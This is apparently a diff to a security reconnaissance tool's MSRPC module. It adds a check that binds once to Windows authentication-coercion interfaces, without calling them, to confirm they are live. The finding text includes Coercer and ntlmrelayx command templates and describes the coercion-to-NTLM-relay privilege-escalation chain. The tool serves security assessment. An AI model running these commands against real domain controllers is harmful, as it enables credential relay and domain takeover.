@@ -29,11 +29,16 @@ import socket
 import struct
 import uuid
 
+from ..core import proxy
 from ..core.models import Host, Port
 
 
 _DEFAULT_PORT = 135
 _TIMEOUT = 5.0
+# Bench-safe T2 verify runs one fresh bind per coercion endpoint. Clamp the
+# per-endpoint timeout so a hung dynamic port cannot stall the module beyond a
+# handful of seconds regardless of caller-supplied budget.
+_T2_MAX_TIMEOUT = 6.0
 
 # NDR transfer syntax — the encoding every one of these interfaces speaks.
 _NDR = uuid.UUID("8a885d04-1ceb-11c9-9fe8-08002b104860")
@@ -421,6 +426,72 @@ def epm_lookup_towers(ip: str, port: int = _DEFAULT_PORT,
                 pass
 
 
+def verify_coercion_bindable(ip: str, endpoints: list[dict],
+                              coercion_uuids: list[str],
+                              timeout: float = _TIMEOUT) -> list[dict]:
+    """SAFE T2 verify for `msrpc_coercion`: for each coercion interface the
+    EPM disclosed on a dynamic ncacn_ip_tcp port, open ONE fresh TCP
+    connection and send exactly one DCE/RPC bind PDU for that specific
+    interface. A bind_ack is real server-side evidence the coercion server
+    is currently accepting binds — the wire differentiator between "EPM
+    listed the UUID" and "the coerce endpoint is live right now on this
+    port." recce NEVER issues the coercion request itself (no
+    RpcRemoteFindFirstPrinterChangeNotificationEx, no EfsRpcOpenFileRaw,
+    no NetrDfsAddStdRoot); only a bind. Single-shot per endpoint, bounded
+    timeout via proxy.scaled, no writes / no state change.
+    """
+    coercion_set = set(coercion_uuids or [])
+    if not coercion_set or not endpoints:
+        return []
+    t = proxy.scaled(min(timeout, _T2_MAX_TIMEOUT))
+    results: list[dict] = []
+    seen: set[tuple[str, int]] = set()
+    for ep in endpoints:
+        u = ep.get("uuid")
+        p = ep.get("tcp_port") or ep.get("port") or 0
+        if u not in coercion_set or not p or (u, p) in seen:
+            continue
+        seen.add((u, p))
+        try:
+            iface = uuid.UUID(u)
+        except (ValueError, TypeError):
+            continue
+        ver_maj = int(ep.get("ver_major") or 1)
+        ver_min = int(ep.get("ver_minor") or 0)
+        label = _KNOWN.get(u, ("?", "?", "?"))
+        sock = None
+        try:
+            sock = socket.create_connection((ip, p), timeout=t)
+            ok = _bind(sock, iface, t, ver_maj, ver_min)
+            if ok:
+                results.append({
+                    "uuid": u, "port": p, "bindable": True,
+                    "evidence": (
+                        f"DCE/RPC bind_ack from {ip}:{p} for "
+                        f"{label[1]} ({label[0]}) v{ver_maj}.{ver_min} "
+                        f"— coercion interface accepts fresh binds right "
+                        f"now (no coerce request issued).")})
+            else:
+                results.append({
+                    "uuid": u, "port": p, "bindable": False,
+                    "evidence": (
+                        f"{label[1]} ({label[0]}) at {ip}:{p} did NOT "
+                        f"bind_ack — EPM disclosed the port but the "
+                        f"interface is not currently serving.")})
+        except OSError:
+            results.append({
+                "uuid": u, "port": p, "bindable": False,
+                "evidence": (f"TCP {ip}:{p} unreachable — dynamic port "
+                             f"advertised for {label[1]} but closed.")})
+        finally:
+            if sock is not None:
+                try:
+                    sock.close()
+                except OSError:
+                    pass
+    return results
+
+
 def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict:
     out: dict = {"reachable": False}
     ifaces = server_alive2(ip, port, timeout)
@@ -445,6 +516,17 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT) -> dict
                for t in towers if t.get("tcp_port")]
         if dyn:
             out["endpoints"] = dyn
+    # T2 verify (SAFE): for coercion UUIDs disclosed on a dynamic
+    # ncacn_ip_tcp port, confirm a fresh bind_ack. Never issues a coerce.
+    # Only runs when we have BOTH coercion presence and dynamic ports —
+    # a hard prerequisite that keeps the probe cheap (typically 0-2
+    # extra sockets on a normal DC, none on a workstation).
+    coerce_uuids = out.get("coercion") or []
+    tcp_endpoints = [t for t in towers if t.get("tcp_port")] if towers else []
+    if coerce_uuids and tcp_endpoints:
+        cb = verify_coercion_bindable(ip, tcp_endpoints, coerce_uuids, timeout)
+        if cb:
+            out["coercion_bindable"] = cb
     if not out["reachable"]:
         # Bind failed both ways but the port may still be open — record that we
         # reached TCP so a firewalled-but-listening host is distinguishable.
@@ -468,14 +550,17 @@ def msrpc_targets(hosts: list[Host]) -> list[dict]:
 
 
 def _finding(sev, title, target, detail, tool, cmd, rem, cwes, kind="",
-             exploit_note="", depth_tier=""):
+             exploit_note="", depth_tier="", output=""):
     # Per-finding tool: MSRPC findings point at different tools (rpcmap for the
     # endpoint mapper dump, Coercer for the coercion interfaces), unlike other
     # modules where every finding routes back to one CLI.
-    return {"severity": sev, "title": title, "target": target, "detail": detail,
-            "tool": tool, "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind,
-            "exploit_note": exploit_note, "depth_tier": depth_tier}
+    f = {"severity": sev, "title": title, "target": target, "detail": detail,
+         "tool": tool, "command": cmd, "remediation": rem,
+         "cwes": cwes, "kind": kind,
+         "exploit_note": exploit_note, "depth_tier": depth_tier}
+    if output:
+        f["output"] = output
+    return f
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -519,6 +604,29 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
             coercion = pr.get("coercion") or []
             if coercion:
                 names = [f"{_KNOWN[u][1]} ({_KNOWN[u][0]})" for u in coercion]
+                # T2 promotion: bench-safe verify — for each coercion UUID
+                # disclosed on a dynamic ncacn_ip_tcp port, confirm the
+                # interface still bind_ack's a fresh connection. A bind_ack
+                # is direct wire evidence the coerce endpoint is live NOW
+                # (not just historically registered). recce never issues
+                # the coercion request itself; only the bind. When no
+                # coercion UUID has a TCP endpoint (many coercion ifaces
+                # are named-pipe-only over SMB), we stay at T1.
+                cb = pr.get("coercion_bindable") or []
+                bindable = [c for c in cb if c.get("bindable")]
+                extra = ""
+                pivot_output = ""
+                depth_tier = "t1"
+                if bindable:
+                    depth_tier = "t2"
+                    ev_lines = "\n".join(c["evidence"] for c in bindable)
+                    extra = (
+                        f"\n\nT2 wire evidence: {len(bindable)} coercion "
+                        f"interface(s) accepted a fresh DCE/RPC bind on "
+                        f"their disclosed dynamic port — the coerce "
+                        f"endpoint is confirmed live. recce did NOT issue "
+                        f"any coerce call, only a bind.")
+                    pivot_output = ev_lines
                 out.append(_finding(
                     "high",
                     "MSRPC exposes authentication-coercion interfaces", tgt,
@@ -526,7 +634,8 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"made to authenticate to an attacker-chosen host: {', '.join(names)}. "
                     f"Combined with a relay target that accepts NTLM (recce lists those "
                     f"under the AD findings), this is the standard coercion -> relay -> "
-                    f"privilege chain. recce did NOT invoke them.",
+                    f"privilege chain. recce did NOT invoke them."
+                    + extra,
                     "PetitPotam / Coercer / ntlmrelayx",
                     f"Coercer coerce -u USER -p PASS -t {h.ip} -l <listener>   # then "
                     f"ntlmrelayx.py -t ldaps://<dc> --escalate-user <you>",
@@ -539,7 +648,7 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "respond); Coercer coerce -t <ip> -l <you-ip> -u <lp> "
                         "-p <lpass>; pair with impacket-ntlmrelayx -t ldap://<dc> "
                         "or smb://<unsigned-target>."),
-                    depth_tier="t1"))
+                    depth_tier=depth_tier, output=pivot_output))
 
             ifaces = pr.get("interfaces") or []
             extra = [u for u in ifaces if u not in _COERCION]
